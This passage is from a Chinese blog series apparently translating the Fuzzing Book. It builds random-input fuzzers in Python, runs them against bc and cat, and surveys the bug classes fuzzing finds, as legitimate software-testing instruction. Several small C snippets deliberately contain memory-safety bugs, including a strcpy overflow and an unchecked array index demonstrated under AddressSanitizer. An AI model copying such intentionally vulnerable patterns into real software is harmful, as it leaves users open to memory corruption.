input&#39;</code></pre><p>但是到目前为止，我们仍无法对程序行为进行分类：</p><pre><code class="python">outcome：&#39;UNRESOLVED&#39;</code></pre><p>下面的<code>ProgramRunner</code>类将输入传送到程序，并根据运行结果分类：</p><pre><code class="python">class ProgramRunner(Runner):    def __init__(self, program):        &quot;&quot;&quot;Initialize.  `program` is a program spec as passed to `subprocess.run()`&quot;&quot;&quot;        self.program = program    def run_process(self, inp=&quot;&quot;):        &quot;&quot;&quot;Run the program with `inp` as input.  Return result of `subprocess.run()`.&quot;&quot;&quot;        return subprocess.run(self.program,                              input=inp,                              stdout=subprocess.PIPE,                              stderr=subprocess.PIPE,                              universal_newlines=True)    def run(self, inp=&quot;&quot;):        &quot;&quot;&quot;Run the program with `inp` as input.  Return test outcome based on result of `subprocess.run()`.&quot;&quot;&quot;        result = self.run_process(inp)        if result.returncode == 0:            outcome = self.PASS        elif result.returncode &lt; 0:            outcome = self.FAIL        else:            outcome = self.UNRESOLVED        return (result, outcome)</code></pre><p>如果是针对二进制程序文件，可能还要小改一下：</p><pre><code class="python">class BinaryProgramRunner(ProgramRunner):    def run_process(self, inp=&quot;&quot;):        &quot;&quot;&quot;Run the program with `inp` as input.  Return result of `subprocess.run()`.&quot;&quot;&quot;        return subprocess.run(self.program,                              input=inp.encode(),                              stdout=subprocess.PIPE,                              stderr=subprocess.PIPE)</code></pre><p>让我们演示一个<code>ProgramRunner</code>使用<code>cat</code>程序的实际例子：cat程序将其输入复制到其输出。</p><p>我们看到标准的调用<code>cat</code>简单地完成了这项工作，其输出<code>cat</code>与其输入相同：</p><pre><code class="python">cat = ProgramRunner(program=&quot;cat&quot;)cat.run(&quot;hello&quot;)</code></pre><pre><code class="python">输出：(CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&#39;hello&#39;, stderr=&#39;&#39;), &#39;PASS&#39;)</code></pre><p>是不是封装后使用起来更方便了。</p><h3 id="创建Fuzzer的类："><a href="#创建Fuzzer的类：" class="headerlink" title="创建Fuzzer的类："></a>创建Fuzzer的类：</h3><p>现在我们来一起定义一个fuzzer类，fuzzer的主要作用其实就是生成数据并送至runner.</p><p>Fuzzer的基类提供了一些创建输入的核心方法，随后run（）将这些数据传送至Runner并返回结果；runs()可以设定发送的次数（trials）</p><pre><code class="python">class Fuzzer(object):    def __init__(self):        pass    def fuzz(self):        &quot;&quot;&quot;Return fuzz input&quot;&quot;&quot;        return &quot;&quot;    def run(self, runner=Runner()):        &quot;&quot;&quot;Run `runner` with fuzz input&quot;&quot;&quot;        return runner.run(self.fuzz())    def runs(self, runner=PrintRunner(), trials=10):        &quot;&quot;&quot;Run `runner` with fuzz input, `trials` times&quot;&quot;&quot;        # Note: the list comprehension below does not invoke self.run() for subclasses        # return [self.run(runner) for i in range(trials)]        outcomes = []        for i in range(trials):            outcomes.append(self.run(runner))        return outcomes</code></pre><p>默认情况下，<code>Fuzzer</code>对象不执行任何操作。但在<code>RandomFuzzer</code>中，子类实现了上述功能的<code>fuzzer()</code>功能，并增加了一个附加参数<code>min_length</code>以指定生成数据的最小长度。</p><pre><code class="python">class RandomFuzzer(Fuzzer):    def __init__(self, min_length=10, max_length=100,                 char_start=32, char_range=32):        &quot;&quot;&quot;Produce strings of `min_length` to `max_length` characters           in the range [`char_start`, `char_start` + `char_range`]&quot;&quot;&quot;        self.min_length = min_length        self.max_length = max_length        self.char_start = char_start        self.char_range = char_range    def fuzz(self):        string_length = random.randrange(self.min_length, self.max_length + 1)        out = &quot;&quot;        for i in range(0, string_length):            out += chr(random.randrange(self.char_start,                                        self.char_start + self.char_range))        return out</code></pre><p>使用<code>RandomFuzzer</code>，我们现在可以创建一个模糊器，在创建模糊器时只需配置一次即可。</p><pre><code class="python">random_fuzzer = RandomFuzzer(min_length=20, max_length=20)for i in range(10):    print(random_fuzzer.fuzz())</code></pre><pre><code class="python">&#39;&gt;23&gt;33)(&amp;&quot;09.377.*3*+:5 ? (?1$4&lt;&gt;!?3&gt;.&#39;4+3/(3 (0%!&gt;!(+9%,#$/51$2964&gt;;)2417&lt;9&quot;2&amp;907.. !7:&amp;--&quot;=$7&#39;,7*(5=5&#39;.!*+&amp;&gt;&quot;)6%9)=,/?:&amp;5) &quot;;.0!=6&gt;3+&gt;)=,6&amp;,?:!#2))- ?:)=63&#39;-,)9#839%)?&amp;(0&lt;6(&quot;*;)4?!(49+8=-&#39;&amp;499%?&lt; &#39;</code></pre><p>下面我们仍然以cat应用程序为例，将这样生成的输入发送到我们先前定义的cat<code>，验证是否</code>cat确实确实将其（模糊的）输入复制到其输出中。</p><pre><code class="python">for i in range(10):    inp = random_fuzzer.fuzz()    result, outcome = cat.run(inp)    assert result.stdout == inp    assert outcome == Runner.PASS</code></pre><p>最后，将Fuzzer与Runner结合十分的普遍</p><pre><code class="python">random_fuzzer.run(cat)</code></pre><pre><code class="python">(CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&#39;?:+= % &lt;1&lt;6$:(&gt;=:9)5&#39;, stderr=&#39;&#39;), &#39;PASS&#39;)</code></pre><p>使用<code>runs()</code>，我们可以重复执行模糊测试多次，以获得结果列表。</p><pre><code class="python">random_fuzzer.runs(cat, 10)</code></pre><pre><code class="python">[(CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&#39;3976%%&amp;+%6=(1)3&amp;3:&lt;9&#39;, stderr=&#39;&#39;),  &#39;PASS&#39;), (CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&#39;33$#42$ 11=*%$20=&lt;.-&#39;, stderr=&#39;&#39;),  &#39;PASS&#39;), (CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&#39;&quot;?&lt;\&#39;#8 &lt;/:*%9.--\&#39;97!&#39;, stderr=&#39;&#39;),  &#39;PASS&#39;), (CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&quot;/0-#(03/!#60&#39;+6&gt;&amp;&amp;72&quot;, stderr=&#39;&#39;),  &#39;PASS&#39;), (CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&quot;=,+:,6&#39;5:950+&gt;&lt;3(*()&quot;, stderr=&#39;&#39;),  &#39;PASS&#39;), (CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&quot; 379+0?&#39;%3137=2:4605&quot;, stderr=&#39;&#39;),  &#39;PASS&#39;), (CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&quot;02&gt;!$&lt;/&#39;*81.#&lt;/22&gt;+:&quot;, stderr=&#39;&#39;),  &#39;PASS&#39;), (CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&quot;=-&lt;&#39;3-#88*%&amp;*9&lt; +1&amp;&amp;&quot;, stderr=&#39;&#39;),  &#39;PASS&#39;), (CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&#39;2;;0=3&amp;6=8&amp;30&amp;&lt;-;?*;&#39;, stderr=&#39;&#39;),  &#39;PASS&#39;), (CompletedProcess(args=&#39;cat&#39;, returncode=0, stdout=&#39;/#05=*3($&gt;::#7!0=12+&#39;, stderr=&#39;&#39;),  &#39;PASS&#39;)]</code></pre><p>有了这些类，我们就可以创建更多更复杂的模糊器了。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> 新趋势 </tag>
            
            <tag> Fuzzbook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzbook2——使用随机输入测试程序</title>
      <link href="2021/01/05/fuzzbook2%E9%9A%8F%E6%9C%BA%E8%BE%93%E5%85%A5/"/>
      <url>2021/01/05/fuzzbook2%E9%9A%8F%E6%9C%BA%E8%BE%93%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><img src="https://image.3001.net/images/20210111/1610358571_5ffc1f2b95e569df29bae.png!small" alt="image-20201005165901975"></p><p>在本章中，我们将从介绍最简单的测试生成技术开始—随机文本生成（也称为<em>模糊测试）</em>，其关键思想就是将*一串<strong>随机字符</strong>输入到程序中，以期发现故障。</p><a id="more"></a><p><strong>先决条件</strong></p><ul><li>您应该了解软件测试的基础知识；即先学习<a href="https://www.freebuf.com/articles/security-management/255626.html">Fuzzbook系列（1）：软件的安全性测试</a>。</li><li>您应该对Python有一定的了解。</li></ul><h3 id="模糊测试历史"><a href="#模糊测试历史" class="headerlink" title="模糊测试历史"></a><strong>模糊测试历史</strong></h3><p>模糊测试诞生于1988年秋季的一个黑暗暴风雨之夜 [<a href="http://us.artechhouse.com/Fuzzing-for-Software-Security-Testing-and-Quality-Assurance-Second-Edition-P1930.aspx">Takanen <em>et al</em>, 2008.</a>]。巴顿·米勒教授坐在麦迪逊威斯康星州的公寓里，通过一条1200波特的电话线连接到他所属大学的计算机。阵阵的雷暴在线路上造成噪音，这些噪音又导致两端的UNIX命令获得错误的输入，并导致崩溃。频繁的崩溃使他感到惊讶—我们编写的程序不是应该十分强大吗？作为一名科学家，他想探究该问题的严重程度及其原因。因此，他为威斯康星大学麦迪逊分校的学生<em>编写</em>了一个<em>编程练习</em>，而该练习将使他的学生创建第一个模糊测试器。</p><p>这项作业的原文描述是这样的：</p><blockquote><p> The goal of this project is to evaluate the robustness of various UNIX utility programs, given an unpredictable input stream. […] First, you will build a <em>fuzz generator</em>. This is a program that will output a random character stream. Second, you will take the fuzz generator and use it to attack as many UNIX utilities as possible, with the goal of trying to break them.</p><p>该项目的目标是在给定不可预测的输入流的情况下评估各种UNIX实用程序的健壮性。[…]首先，您将构建一个<em>模糊发生器</em>。这是一个将输出随机字符流的程序。其次，您将使用模糊发生器，并使用它来攻击尽可能多的UNIX实用程序，以试图破坏它们。</p></blockquote><p>这个作业在不经意间抓住了模糊测试的本质：创建随机的输入，并持续性观察它是否会破坏目标应用程序，理论上只要运行足够长的时间，我们就会看到错误的发生。</p><h3 id="创建一个简单的Fuzzer"><a href="#创建一个简单的Fuzzer" class="headerlink" title="创建一个简单的Fuzzer"></a>创建一个简单的Fuzzer</h3><p>让我们尝试完成上面这项作业，并用python构建一个模糊生成器。这个想法就是产生随机的字符，并将它们添加到缓冲区字符串变量（out）里，最后返回字符串。</p><p>要实现该功能可能会用到python的以下功能函数：</p><ul><li><code>random.randrange(start, end)</code> –从start到end的范围里返回一个随机数</li><li><code>range(start, end)</code> –创建一个start到end范围内为整数的列表，通常在迭代中使用</li><li><code>for elem in list: body</code>–从list列表中获取每个值，带入<code>body</code>循环执行</li><li><code>for i in range(start, end): body</code>–使用 i 循环执行body函数，i 的范围为从start到end-1</li><li><code>chr(n)</code> –返回带有ASCII码的字符 <code>n</code></li></ul><p>要使用随机数，我们必须导入相应的模块：</p><pre><code class="python">import random</code></pre><p>下面是实际<code>fuzzer()</code>功能：</p><pre><code class="python">def fuzzer(max_length=100, char_start=32, char_range=32):    &quot;&quot;&quot;一个字符串最多有`max_length`个字符，       随机生成字符的ASCII码范围为 [`char_start`, `char_start` + `char_range`]&quot;&quot;&quot;    string_length = random.randrange(0, max_length + 1)    out = &quot;&quot;    for i in range(0, string_length):        out += chr(random.randrange(char_start, char_start + char_range))    return out</code></pre><p>如果使用默认参数，该fuzzer（）函数会返回遗传随机字符：</p><pre><code class="python">fuzzer()返回：&#39;!7#%&quot;*#0=)$;%6*;&gt;638:*&gt;80&quot;=&lt;/&gt;(/*:-(2&lt;4 !:5*6856&amp;?&quot;&quot;11&lt;7+%&lt;%7,4.8,*+&amp;,,$,.&quot;&#39;</code></pre><p>巴特·米勒（Bart Miller）为此类随机创造了“模糊”一词。现在，假设此“模糊”字符串正是所期望特定输入格式的程序输入-例如：用逗号分隔的值列表或电子邮件地址，以此检验程序是否可以处理此类输入而不会出现任何问题？</p><p>如果上述模糊输入已经ok，请考虑可以轻松设置模糊以产生其他各种类型的输入。例如，我们还可以<code>fuzzer()</code>产生一系列小写字母。我们<code>ord(c)</code>用来返回字符c的ASCII码。</p><pre><code class="python">fuzzer(1000, ord(&#39;a&#39;), 26)返回：&#39;zskscocrxllosagkvaszlngpysurezehvcqcghygphnhonehczraznkibltfmocxddoxcmrvatcleysksodzlwmzdndoxrjfqigjhqjxkblyrtoaydlwwisrvxtxsejhfbnforvlfisojqaktcxpmjqsfsycisoexjctydzxzzutukdztxvdpqbjuqmsectwjvylvbixzfmqiabdnihqagsvlyxwxxconminadcaqjdzcnzfjlwccyudmdfceiepwvyggepjxoeqaqbjzvmjdlebxqvehkmlevoofjlilegieeihmetjappbisqgrjhglzgffqrdqcwfmmwqecxlqfpvgtvcddvmwkplmwadgiyckrfjddxnegvmxravaunzwhpfpyzuyyavwwtgykwfszasvlbwojetvcygectelwkputfczgsfsbclnkzzcjfywitooygjwqujseflqyvqgyzpvknddzemkegrjjrshbouqxcmixnqhgsgdwgzwzmgzfajymbcfezqxndbmzwnxjeevgtpjtcwgbzptozflrwvuopohbvpmpaifnyyfvbzzdsdlznusarkmmtazptbjbqdkrsnrpgdffemnpehoapiiudokczwrvpsonybfpaeyorrgjdmgvkvupdtkrequicexqkoikygepawmwsdcrhivoegynnhodfhryeqbebtbqnwhogdfrsrksntqjbocvislhgrgchkhpaiugpbdygwkhrtyniufabdnqhtnwreiascfvmuhettfpbowbjadfxnbtzhobnxsnf&#39;</code></pre><p>假设程序需要一个标识符作为其输入。它会期望这么长的标识符吗？</p><h3 id="对外部程序进行模糊测试"><a href="#对外部程序进行模糊测试" class="headerlink" title="对外部程序进行模糊测试"></a>对外部程序进行模糊测试</h3><h4 id="创建输入文件"><a href="#创建输入文件" class="headerlink" title="创建输入文件"></a>创建输入文件</h4><p>让我们引入一个临时文件模块，以避免使文件系统混乱。</p><pre><code class="python">import osimport tempfile</code></pre><pre><code class="python">basename = &quot;input.txt&quot;tempdir = tempfile.mkdtemp()FILE = os.path.join(tempdir, basename)print(FILE)</code></pre><pre><code class="python">/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/tmpjx6ywfdu/input.txt</code></pre><p>现在，我们可以打开该文件进行写入。Python的<code>open()</code>函数打开一个文件，我们可以在其中写入任意内容。它通常与<code>with</code>语句一起使用，以确保不再需要该文件时就将其关闭。</p><pre><code class="python">data = fuzzer()with open(FILE, &quot;w&quot;) as f:    f.write(data)</code></pre><p>我们可以通过读取其内容来验证该文件是否真的实际创建：</p><pre><code class="python">contents = open(FILE).read()print(contents)assert(contents == data)</code></pre><pre><code class="python">!6&quot;*-2,$994,%*:&quot;$25!2=!+!2#&#39;&#39;6/3&#39;4!6%7056&#39;??2#7;75&gt;27&#39;15#-4.?*&lt;?6&amp;&quot; !3&#39;7-5&gt;18%</code></pre><h4 id="调用外部程序"><a href="#调用外部程序" class="headerlink" title="调用外部程序"></a>调用外部程序</h4><p>现在我们有一个输入的文件了，让我们来测试一个有趣的程序—bc计算器（<code>bc</code> calculator program），该程序采取算术表达式对其求值。</p><p>要调用bc，我们可以使用Python的 <code>subprocess</code>模块：</p><pre><code class="python">import osimport subprocess</code></pre><pre><code class="python">program = &quot;bc&quot;with open(FILE, &quot;w&quot;) as f:    f.write(&quot;2 + 2\n&quot;)result = subprocess.run([program, FILE],                        stdin=subprocess.DEVNULL,                        stdout=subprocess.PIPE,                        stderr=subprocess.PIPE,                        universal_newlines=True)  # Will be &quot;text&quot; in Python 3.7</code></pre><p>从result，我们可以检查程序的输出。对于bc计算器，以下是对算术表达式求解的结果：</p><pre><code class="python">result.stdout</code></pre><pre><code class="python">&#39;4\n&#39;</code></pre><p>我们还可以检查返回的状态值，为0表示程序正确终止。</p><pre><code class="python">result.returncode</code></pre><pre><code class="python">0</code></pre><p>任何错误消息都可以在中找到<code>results.stderr</code>：</p><pre><code class="python">result.stderr</code></pre><pre><code class="python">&#39;&#39;</code></pre><p>除了<code>bc</code>，您实际上可以放入您喜欢的任何程序。但是请注意，如果您的程序能够更改甚至损坏系统，则模糊输入很可能包含执行此操作的数据或命令。</p><p>只是为了好玩，想象一下您将测试一个文件删除程序，模糊器产生有效文件名的机会有多少？</p><h4 id="长时间的运行模糊测试"><a href="#长时间的运行模糊测试" class="headerlink" title="长时间的运行模糊测试"></a>长时间的运行模糊测试</h4><p>现在让我们将大量输入提供给我们的测试程序，以查看它是否可能在某些程序上崩溃。我们将所有结果存储在<code>runs</code>变量中，作为输入数据和实际结果对。（注意：运行此程序可能需要一段时间。）</p><pre><code class="python">trials = 100program = &quot;bc&quot;runs = []for i in range(trials):    data = fuzzer()    with open(FILE, &quot;w&quot;) as f:        f.write(data)    result = subprocess.run([program, FILE],                            stdin=subprocess.DEVNULL,                            stdout=subprocess.PIPE,                            stderr=subprocess.PIPE,                            universal_newlines=True)    runs.append((data, result))</code></pre><p>现在通过<code>runs</code>列表，我们可以查询一些统计的信息。例如，我们可以查询实际有多少次运行。我们使用<code>sum()</code> 汇总列表中的所有元素。</p><pre><code class="python">sum(1 for (data, result) in runs if result.stderr == &quot;&quot;)</code></pre><pre><code class="python">4</code></pre><p>显然，大多数输入都是无效的，这不足为奇，毕竟随机输入不太可能包含有效的算术表达式。</p><p>让我们看一下第一个返回的错误：</p><pre><code class="python">errors = [(data, result) for (data, result) in runs if result.stderr != &quot;&quot;](first_data, first_result) = errors[0]print(repr(first_data))print(first_result.stderr)</code></pre><pre><code class="python">&#39;5*,55&amp;8&gt;&quot;86,?&quot;/7!1%5-**&amp;-$&amp;)$91;&quot;21(\&#39;8&quot;(%$&#39;/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/tmpjx6ywfdu/input.txt 1: parse error/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/tmpjx6ywfdu/input.txt 1: illegal character: &amp;/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/tmpjx6ywfdu/input.txt 1: parse error/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/tmpjx6ywfdu/input.txt 1: illegal character: &amp;/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/tmpjx6ywfdu/input.txt 1: illegal character: $/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/tmpjx6ywfdu/input.txt 1: illegal character: &amp;/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/tmpjx6ywfdu/input.txt 1: illegal character: $/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/tmpjx6ywfdu/input.txt 1: parse error/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/tmpjx6ywfdu/input.txt 1: illegal character: $</code></pre><p>除了非法字符，解析错误或语法错误外，是否还有其他错误消息？ （比如说崩溃或致命错误？）似乎不是很多，我们简单过滤一下看看：</p><pre><code class="python">[result.stderr for (data, result) in runs if result.stderr != &quot;&quot; and &quot;illegal character&quot; not in result.stderr and &quot;parse error&quot; not in result.stderr and &quot;syntax error&quot; not in result.stderr]</code></pre><pre><code class="python">[]</code></pre><p>也许bc程序的奔溃由程序自己捕捉。不幸的是，返回码似乎永远都不会为0.</p><pre><code class="python">sum(1 for (data, result) in runs if result.returncode != 0)</code></pre><pre><code class="python">0</code></pre><p>我们再让上面的<code>bc</code>测试运行怎么样？当它运行时，让我们看一下1989年的技术水平能做到哪一步。</p><h4 id="利用Fuzzers查找Bug"><a href="#利用Fuzzers查找Bug" class="headerlink" title="利用Fuzzers查找Bug"></a>利用Fuzzers查找Bug</h4><p>当Miller和他的学生在1989年运行他们的第一个模糊器时，他们发现了一个令人震惊的结果：大约1/3的UNIX实用程序遇到了问题—它们在模糊测试输入时崩溃、挂起或以其他方式失败[ <a href="https://doi.org/10.1145/96267.96279">Miller，1990</a> ]。这也包括上面的<code>bc</code>程序。（当然，这些错误现已修复！）</p><p>考虑到这些UNIX实用程序中有许多都是在脚本中使用的，这些脚本也将处理网络输入，因此这是一个令人震惊的结果。程序员迅速构建并运行了自己的模糊器，急于修复所报告的错误，并学会了不再信任外部输入。</p><p>米勒的模糊测试实验发现了什么问题？事实证明，程序员在1990年犯的错误在今天我们仍然在不断地重犯。</p><h5 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h5><p>许多程序具有输入和输入元素的内置最大长度。在像C这样的语言中，很容易超出这些长度，而不会被程序（或程序员）甚至注意到，我们称之为<strong>缓冲区溢出</strong>。例如，以下代码即使有八个以上的字符，也会将<code>input</code>字符串复制到字符串中：</p><pre><code class="python">char weekday[9]; // 8 characters + trailing &#39;\0&#39; terminatorstrcpy (weekday, input);</code></pre><p>比如<code>input</code>是<code>&quot;Wednesday&quot;</code>（9个字符），则该操作已经失败；任何多余的字符（此处<code>&#39;y&#39;</code>以及后面的<code>&#39;\0&#39;</code>字符串终止符）都将被简单地复制到after之后的内存中<code>weekday</code>，从而触发任意行为；可能是一些布尔字符变量，将<code>&#39;n&#39;</code>变为<code>&#39;y&#39;</code>。使用模糊测试，很容易产生任意长的输入和输入元素。</p><p>我们可以在Python函数中轻松模拟这种缓冲区溢出行为：</p><pre><code class="python">def crash_if_too_long(s):    buffer = &quot;Thursday&quot;    if len(s) &gt; len(buffer):        raise ValueError</code></pre><p>不出所料，它很快就崩溃了。</p><pre><code class="python">from ExpectError import ExpectError</code></pre><pre><code class="python">trials = 100with ExpectError():    for i in range(trials):        s = fuzzer()        crash_if_too_long(s)</code></pre><pre><code class="python">Traceback (most recent call last):  File &quot;&lt;ipython-input-23-f83db3d59a06&gt;&quot;, line 5, in &lt;module&gt;    crash_if_too_long(s)  File &quot;&lt;ipython-input-21-928c2d2de976&gt;&quot;, line 4, in crash_if_too_long    raise ValueErrorValueError (expected)</code></pre><p>上面代码中的with ExpectError（）行可确保打印错误消息，但继续执行； 这是为了将其他代码示例中的“意外”错误与“意外”错误区分开。</p><h5 id="缺少错误检查"><a href="#缺少错误检查" class="headerlink" title="缺少错误检查"></a>缺少错误检查</h5><p>许多编程语言没有exceptions，但是在异常情况下，函数会返回特殊的<strong>错误代码</strong>。比如<code>getchar()</code>，C函数通常从标准输入返回一个字符；如果没有可用的输入，它将返回特殊值<code>EOF</code>（end of file）。现在假设程序员正在扫描输入中的下一个字符，以读取字符，<code>getchar()</code>直到读取空格为止：</p><pre><code class="python">while (getchar() != &#39; &#39;) &#123;&#125;</code></pre><p>猜想如果输入在预想之前结束（模糊测试完全可能生成这种结果），会发生什么情况？好吧，<code>getchar()</code>会返回 <code>EOF</code>，并在再次调用时继续返回<code>EOF</code>；因此，上面的代码将会进入一个无限循环。</p><p>同样，我们可以模拟这种丢失的错误检查。如果输入中没有空格，此函数将有效挂起：</p><pre><code class="python">def hang_if_no_space(s):    i = 0    while True:        if i &lt; len(s):            if s[i] == &#39; &#39;:                break        i += 1</code></pre><p>使用我们从在第一篇文章介绍的超时机制，我们可以在一段时间后中断此功能。实测，经过一些模糊的输入后，它确实会挂起。</p><pre><code class="python">from ExpectError import ExpectTimeout</code></pre><pre><code class="python">trials = 100with ExpectTimeout(2):    for i in range(trials):        s = fuzzer()        hang_if_no_space(s)</code></pre><pre><code class="python">Traceback (most recent call last):  File &quot;&lt;ipython-input-26-8e40f7d62a1b&gt;&quot;, line 5, in &lt;module&gt;    hang_if_no_space(s)  File &quot;&lt;ipython-input-24-5f437edacff4&gt;&quot;, line 7, in hang_if_no_space    i += 1  File &quot;&lt;ipython-input-24-5f437edacff4&gt;&quot;, line 7, in hang_if_no_space    i += 1  File &quot;ExpectError.ipynb&quot;, line 59, in check_timeTimeoutError (expected)</code></pre><p>上面代码中的with ExpectTimeout（）行可确保在两秒钟后中断内含代码的执行，并显示错误消息。</p><h5 id="敏感数值"><a href="#敏感数值" class="headerlink" title="敏感数值"></a>敏感数值</h5><p>使用模糊测试，很容易在输入中生成不常见的值，从而引起各种有趣的行为。 再次考虑下面的C语言代码，该代码首先从输入中读取缓冲区大小，然后分配给定大小的缓冲区。</p><pre><code class="c">char *read_input() &#123;    size_t size = read_buffer_size();    char *buffer = (char *)malloc(size);    // fill buffer    return (buffer);&#125;</code></pre><p>如果size很大，超过了程序内存，会发生什么？如果size小于以下字符数，会发生什么？如果size为负数会怎样？通过在此处提供随机数，模糊处理可以造成各种损害。</p><p>同样，我们可以轻松地在Python中模拟此类流氓数字。如果传递的值（字符串）在转换为整数后过大，则函数crash_if_too_large（）将失败。</p><pre><code class="python">def collapse_if_too_large(s):    if int(s) &gt; 1000:        raise ValueError</code></pre><p>我们可以让fuzzer（）创建一个数字字符串：</p><pre><code class="python">long_number = fuzzer(100, ord(&#39;0&#39;), 10)print(long_number)</code></pre><pre><code class="python">7056414967099541967374507745748918952640135045</code></pre><p>如果我们将这些数字输入collapse_if_too_large（），它将很快崩溃。</p><pre><code class="python">with ExpectError():    collapse_if_too_large(long_number)</code></pre><pre><code class="python">Traceback (most recent call last):  File &quot;&lt;ipython-input-29-7a1817f3dbfc&gt;&quot;, line 2, in &lt;module&gt;    collapse_if_too_large(long_number)  File &quot;&lt;ipython-input-27-2c22a83a4dca&gt;&quot;, line 3, in collapse_if_too_large    raise ValueErrorValueError (expected)</code></pre><p>如果我们真的想在系统上分配那么多的内存，那么如上所述使它快速故障实际上是更好的选择。 但实际上，内存的不足可能会极大地降低系统的速度，甚至导致系统完全无响应，并且重启是唯一的选择。</p><p>有人可能会说，这些都是不良编程或不良编程语言的问题。但是，每天都有成千上万的人开始编程，甚至在今天，所有人都一次又一次地犯同样的错误。</p><h4 id="捕获错误"><a href="#捕获错误" class="headerlink" title="捕获错误"></a>捕获错误</h4><p>当Miller和他的学生建造第一个模糊器时，他们可以仅仅因为程序崩溃或挂起就能识别错误-这两个条件很容易识别。但是，如果故障更加微妙，我们需要进行其他检查。</p><h5 id="通用检查器"><a href="#通用检查器" class="headerlink" title="通用检查器"></a>通用检查器</h5><p>如上一部分所述那样，缓冲区溢出是普遍问题实例：在C和C ++之类的语言中，程序可以访问其内存的任意部分，甚至是那些未初始化，已经释放或根本不属于数据部分的部分。如果要编写一个操作系统，这是必需的；如果要获得最大的性能或控制，这是非常好的；但是，如果要避免错误，这是很糟糕的。幸运的是，有一些工具可在运行时帮助捕获此类问题，与模糊测试结合使用时，它们非常有用。</p><h6 id="检查存储器访问"><a href="#检查存储器访问" class="headerlink" title="检查存储器访问"></a>检查存储器访问</h6><p>为了在测试期间捕获有问题的内存访问，可以在特殊的<em>内存检查</em>环境中运行C程序。在运行时，它们检查每个内存操作是否访问有效和初始化的内存。一个流行的例子是<a href="https://clang.llvm.org/docs/AddressSanitizer.html">LLVM Address Sanitizer</a>，它检测整套潜在的危险内存安全违规行为。在下面的示例中，我们将使用该工具编译一个相当简单的C程序，并通过读取内存的已分配部分来引发越界读取。</p><pre><code class="c">with open(&quot;program.c&quot;, &quot;w&quot;) as f:    f.write(&quot;&quot;&quot;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char** argv) &#123;    /* Create an array with 100 bytes, initialized with 42 */    char *buf = malloc(100);    memset(buf, 42, 100);    /* Read the N-th element, with N being the first command-line argument */    int index = atoi(argv[1]);    char val = buf[index];    /* Clean up memory so we don&#39;t leak */    free(buf);    return val;&#125;    &quot;&quot;&quot;)</code></pre><pre><code class="python">from bookutils import print_file</code></pre><pre><code class="python">print_file(&quot;program.c&quot;)</code></pre><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char** argv) &#123;    /* Create an array with 100 bytes, initialized with 42 */    char *buf = malloc(100);    memset(buf, 42, 100);    /* Read the N-th element, with N being the first command-line argument */    int index = atoi(argv[1]);    char val = buf[index];    /* Clean up memory so we don&#39;t leak */    free(buf);    return val;&#125;</code></pre><p>我们在启用ASAN的情况下编译此C程序：</p><pre><code class="python">!clang -fsanitize=address -g -o program program.c</code></pre><p>如果运行参数为的程序<code>99</code>，则返回<code>buf[99]</code>，即42。</p><pre><code class="python">!./program 99; echo $?</code></pre><pre><code class="python">42</code></pre><p>但是，访问buf [110]会导致AddressSanitizer中出现越界错误。</p><pre><code class="python">!./program 110</code></pre><pre><code class="python">===================================================================9753==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60b0000000ae at pc 0x000104078ef0 bp 0x7ffeebb87390 sp 0x7ffeebb87388READ of size 1 at 0x60b0000000ae thread T0    #0 0x104078eef in main program.c:12    #1 0x7fff6a25acc8 in start (libdyld.dylib:x86_64+0x1acc8)0x60b0000000ae is located 10 bytes to the right of 100-byte region [0x60b000000040,0x60b0000000a4)allocated by thread T0 here:    #0 0x1040df793 in wrap_malloc (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x61793)    #1 0x104078e3f in main program.c:7    #2 0x7fff6a25acc8 in start (libdyld.dylib:x86_64+0x1acc8)SUMMARY: AddressSanitizer: heap-buffer-overflow program.c:12 in mainShadow bytes around the buggy address:  0x1c15ffffffc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x1c15ffffffd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x1c15ffffffe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x1c15fffffff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x1c1600000000: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00=&gt;0x1c1600000010: 00 00 00 00 04[fa]fa fa fa fa fa fa fa fa fa fa  0x1c1600000020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x1c1600000030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x1c1600000040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x1c1600000050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x1c1600000060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 